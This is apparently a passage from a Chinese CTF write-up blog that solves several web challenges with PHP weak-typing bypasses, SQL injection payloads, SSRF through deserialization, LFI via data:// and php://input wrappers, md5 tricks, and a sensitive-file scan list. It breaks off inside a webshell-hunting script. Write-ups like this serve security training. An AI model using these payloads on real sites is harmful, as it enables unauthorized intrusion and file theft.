class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;.svn&#x2F;</span><br><span class="line">&#x2F;.DS_Store&#x2F;</span><br><span class="line">&#x2F;.idea&#x2F;</span><br><span class="line">&#x2F;.git&#x2F;</span><br><span class="line">.index.php.swp</span><br><span class="line">index.php.bak</span><br><span class="line">.flag.php.swp</span><br><span class="line">flag.php</span><br><span class="line">config.php</span><br><span class="line">fl4g.php</span><br><span class="line">f14g.php</span><br><span class="line">f1ag.php</span><br><span class="line">wwwroot.rar</span><br><span class="line">wwwroot.zip</span><br><span class="line">www.rar</span><br><span class="line">www.zip</span><br><span class="line">&#x2F;.git&#x2F;HEAD</span><br><span class="line">&#x2F;.git&#x2F;index</span><br><span class="line">&#x2F;.git&#x2F;config</span><br><span class="line">&#x2F;.git&#x2F;description</span><br><span class="line">&#x2F;README.MD</span><br><span class="line">&#x2F;README.md</span><br><span class="line">&#x2F;README</span><br><span class="line">&#x2F;.gitignore</span><br><span class="line">&#x2F;.svn</span><br><span class="line">&#x2F;.svn&#x2F;wc.db</span><br><span class="line">&#x2F;.svn&#x2F;entries</span><br><span class="line">&#x2F;.hg</span><br><span class="line">&#x2F;.ds_store</span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes</span><br><span class="line">&#x2F;WEB-INF&#x2F;lib</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.propertie</span><br><span class="line">&#x2F;CVS&#x2F;Root</span><br><span class="line">&#x2F;CVS&#x2F;Entries</span><br><span class="line">&#x2F;.bzr&#x2F;</span><br><span class="line">&#x2F;_viminfo</span><br><span class="line">&#x2F;.viminfo</span><br><span class="line">&#x2F;.save</span><br><span class="line">&#x2F;.save1</span><br><span class="line">&#x2F;.save2</span><br><span class="line">&#x2F;.save3</span><br><span class="line">&#x2F;.bak_Edietplus</span><br><span class="line">&#x2F;.bak</span><br><span class="line">&#x2F;.back</span><br><span class="line">&#x2F;phpinfo.php</span><br><span class="line">&#x2F;test.php</span><br><span class="line">&#x2F;.bash_history</span><br></pre></td></tr></table></figure><p>扫到源码：index.php.bak，下载下来查看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>$key == $str</code>简单的弱类型比较绕过，<code>/?key=123</code>访问即可获得flag。</p><p><img src="https://img.0x002.com/article/BuuCTF2/==.jpg" alt="常见PHP弱比较"></p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>打开题目，在pay.php页面处发现注释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (is_numeric(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>结合页面内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">If you want to buy the FLAG:</span><br><span class="line">You must be a student from CUIT!!!</span><br><span class="line">You must be answer the correct password!!!</span><br></pre></td></tr></table></figure><p>用BurpSuite抓包后，在cookie处发现端倪：<code>user=0</code>，猜测修改为1之后才能满足：<code>You must be a student from CUIT!!!</code>。</p><p>password处为简单的PHP弱类型比较，要求不能输入数字又与数字404<code>==</code>比较成立。</p><p>右键选择<code>Change request method</code>改为POST型，添加上money与password参数：<code>money=100000000&amp;password=404a</code>，发送后返回<code>you are Cuiter&lt;/br&gt;Password Right!&lt;/br&gt;Nember lenth is too long&lt;/br&gt;</code>。</p><p>限制了长度，很明显可以通过科学计数法绕过，将money参数修改成：<code>1e12</code>即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;pay.php HTTP&#x2F;1.1</span><br><span class="line">Host: xxx.node3.buuoj.cn</span><br><span class="line">Cookie: user&#x3D;1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 24</span><br><span class="line"></span><br><span class="line">money&#x3D;1e12&amp;password&#x3D;404a</span><br></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>简单上传题，上传phtml文件绕过即可。</p><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>打开题目，在<code>join.php</code>处发现注入，此处推荐报错注入，但我做的时候使用的布尔盲注。</p><p>爆表名，得表名<code>users</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; and if(mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1)&#x3D;&#39;&#39;,exp(4000),1)%23&amp;passwd&#x3D;1&amp;age&#x3D;1&amp;blog&#x3D;http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure><p>爆列名，得列名<code>no,username,passwd,data</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; and if(mid((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;),1,1)&#x3D;&#39;&#39;,exp(4000),1)%23&amp;passwd&#x3D;1&amp;age&#x3D;1&amp;blog&#x3D;http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure><p>发现并无flag字段，猜测考点应该不止SQL注入。</p><p>发现存在robots.txt文件，访问得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;user.php.bak</span><br></pre></td></tr></table></figure><p>访问得到user.php的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现此处存在SSRF漏洞。</p><p>在<code>view.php?no=1</code>发现SQL注入，注意此处有正则判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no&#x3D;-1%20union&#x2F;**&#x2F;select%201,2,3,4%20%23</span><br></pre></td></tr></table></figure><p>返回错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Notice: unserialize(): Error at offset 0 of 1 bytes in &#x2F;var&#x2F;www&#x2F;html&#x2F;view.php on line 31</span><br></pre></td></tr></table></figure><p>猜测SQL数据为序列化之后的数据。</p><p>利用报错注入注出数据（concat函数被拦截）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no&#x3D;1%20and%20updatexml(1,make_set(3,%27~%27,(select%20group_concat(data)%20from%20users)),1)%23</span><br></pre></td></tr></table></figure><p>可以发现data数据为UserInfo类的序列化数据。</p><p>简单的反序列得能利用SSRF漏洞的EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>最后再view.php函数利用上此EXP即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;view.php?no&#x3D;1%20union&#x2F;**&#x2F;select%201,2,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;%27%23</span><br></pre></td></tr></table></figure><p>在源代码得到Iframe标签的Base64值，解码得到flag.php的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;7d808a80-041e-40f2-b87f-89cfc4f86895&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>打开题目得到首页源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>稍显要绕过<code>file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;</code>，由于我们并不知道满足条件的文件，故此处很容易可想到是要考LFI。</p><p>此处有两种方法pass：</p><ul><li>使用data协议</li><li>使用php://input伪协议</li></ul><p>第二处对变量$file进行了正则判断，使得我们无法直接LFI读flag。</p><p>通过旁边的注释<code>//useless.php</code>，我们先使用LFI读取其源码得：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>配合index.php文件的$password很容易知道最后一个考点是反序列化漏洞。</p><p><code>echo $password;</code>会触发对象的__tostring魔法函数，从而执行代码，读取FLAG。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、GET: &#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D</span><br><span class="line"></span><br><span class="line">2、POST: &#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D</span><br><span class="line"></span><br><span class="line">welcome to the zjctf</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>打开题目发现从首页跳转到了：<code>/leveldo4.php</code>。</p><p>用抓包工具重放发现首页的跳转包无有用数据，而在<code>/leveldo4.php</code>请求的响应头出得到提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: select * from &#39;admin&#39; where password&#x3D;md5($pass,true)</span><br></pre></td></tr></table></figure><p>这也是常考点了，在php中md5函数格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string md5( string $str[, bool $raw_output &#x3D; false] )</span><br></pre></td></tr></table></figure><ul><li><p><code>str</code></p><p>原始字符串。       </p></li><li><p><code>raw_output</code></p><p>如果可选的 <code>raw_output</code> 被设置为 <strong><code>TRUE</code></strong>，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。 </p></li></ul><p>我们注意到，当raw_output为ture时返回是二进制格式，而md5函数的返回值为string类型，因此这里会隐式的将原始二进制格式数据转成字符串格式，这就造成了单引号逃逸的情况。</p><p>如经典的<code>ffifdyop</code>，经由<code>md5($str, true)</code>转换后得到：<code>&#39;or&#39;6]!r,b</code>，可以看到单引号被逃逸了出来，且拼接上了一个永真条件。</p><p>将<code>ffifdyop</code>提交后，页面跳转到新的地址：<code>levels91.php</code>。</p><p>在HTML源代码处得到提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; md5(<span class="variable">$a</span>) == md5(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>这里是弱类型比较考点。</p><p>简单的说就是”0e”开头的字符串在进行弱类型比较的时候会认为是科学计数法表示的数字。</p><p>所以<code>0e545993274517709034328855841020</code>相当于<code>0*10^545993274517709034328855841020=0</code>，与<code>0e342768416822451524974117254469</code>相同，也都是数字0。</p><p>所以<code>&quot;0e545993274517709034328855841020&quot; == &quot;0e342768416822451524974117254469&quot;</code>成立，也即：<code>md5(&quot;s155964671a&quot;) == md5(&quot;s155964671a&quot;)</code>成立。</p><p>下面列举几个相关的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br></pre></td></tr></table></figure><p>通过后再次跳转至：<code>levell14.php</code>，打开页面即得到源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用了<code>===</code> 强比较做判断，<code>0e</code>科学计数法的方法不再管用。</p><p>这里使用的是md5函数无法对数组类型的参数做处理，会返回NULL并产生一个WARNING级别的消息。</p><p>利用这个特点，我们POST如下数据即可通过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]&#x3D;1&amp;param2[]&#x3D;2</span><br></pre></td></tr></table></figure><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>打开题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">雁过留声，人过留名，此网站已被黑</span><br><span class="line">我也是很佩服你们公司的开发，特地备份了网站源码到www.tar.gz以供大家观赏</span><br></pre></td></tr></table></figure><p>把备份源码下载到本地：</p><p>发现里边有3002个php文件，随便打开一个发现代码都是乱七八糟的。</p><p>各种危险函数<code>assert、eval</code>等，不过都是被限制得死死的。</p><p>看来得需要我们编写脚本来一份一份得跑才行。</p><p>下面是我简单编写的多线程脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># author: yunen</span></span><br><span class="line"><span class="comment"># blog: https://www.0x002.com/</span></span><br><span class="line"><span class="keyword">import</span> requests, threading, queue, os, re, time</span><br><span class="line"></span><br><span class="line">FileQueue = queue.Queue()</span><br><span class="line">WebShellQueue = queue.Queue()</span><br><span class="line">evalPattern = <span class="string">&quot;\$\_(GET|POST)\[&#x27;(\S+)&#x27;\]&quot;</span></span><br><span class="line">path = <span 